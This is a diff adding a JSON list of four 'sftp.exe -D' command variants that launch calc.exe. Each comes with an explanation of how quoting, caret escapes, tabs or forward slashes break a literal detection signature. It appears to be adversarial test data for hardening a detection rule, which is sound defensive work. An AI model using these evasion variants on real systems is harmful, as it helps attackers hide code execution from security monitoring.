@@ -1,0 +1,18 @@
+[
+{
+"output": "sftp.exe "-D" ..\..\..\Windows\System32\calc.exe user@host",
+"explanation": "Insertion technique: Quoting the '-D' flag modifies the string in the logs to '"-D"', breaking the exact continuous literal match for ' -D ..' or ' -D C:\'. The utility itself ignores the internal quotes upon parsing arguments, executing identically."
+},
+{
+"output": "cmd.exe /c sftp.exe -^D ..\..\..\Windows\System32\calc.exe user@host",
+"explanation": "Insertion technique: Utilizing the Windows command line caret (^) escape symbol forces the log structure to read '-^D', avoiding the static signature logic completely. The command processor strips the caret immediately before process initiation, leaving binary runtime behavior unaltered."
+},
+{
+"output": "sftp.exe\t-D\t..\..\..\Windows\System32\calc.exe\tuser@host",
+"explanation": "Substitution technique: Exchanging normal white space buffers with horizontal tab delimiters (\t). The Windows application interface tokens horizontal tabs identically to a space, but this shift disrupts the rule's strict requirement for an explicit leading space character preceding the hyphen."
+},
+{
+"output": "sftp.exe -D C:/Windows/System32/calc.exe user@host",
+"explanation": "Recoding technique: Changing traditional Windows path separator backslashes ('\') into system-compatible forward slashes ('/'). Windows subsystems accept forward slashes perfectly for tracking folder objects, but this directly evades the literal pattern search for ' -D C:\'."
+}
+]
